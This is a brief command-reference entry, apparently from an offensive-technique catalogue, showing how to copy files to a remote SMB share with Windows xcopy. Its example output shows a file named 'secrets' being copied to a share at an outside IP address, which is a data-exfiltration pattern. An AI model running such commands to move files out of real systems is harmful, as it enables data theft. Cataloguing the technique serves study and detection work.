---
id: eb3a6cfc-dfac-45cc-a14a-91422b52205a
name: ' xcopy Upload Files to a Remote SMB'
type: command
executor: command_prompt
data: xcopy $_FILENAME \\$_REMOTE_IP\$_SHARE
output: 'C:\>xcopy secrets \\10.10.10.100\files\secrets

  C:secrets

  1 File(s) copied'
created_at: '2019-11-25T23:00:09.680779+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[xcopy]]'
---

#  xcopy Upload Files to a Remote SMB

```command_prompt
xcopy $_FILENAME \\$_REMOTE_IP\$_SHARE
```

## Expected Output

```
C:\>xcopy secrets \\10.10.10.100\files\secrets
C:secrets
1 File(s) copied
```


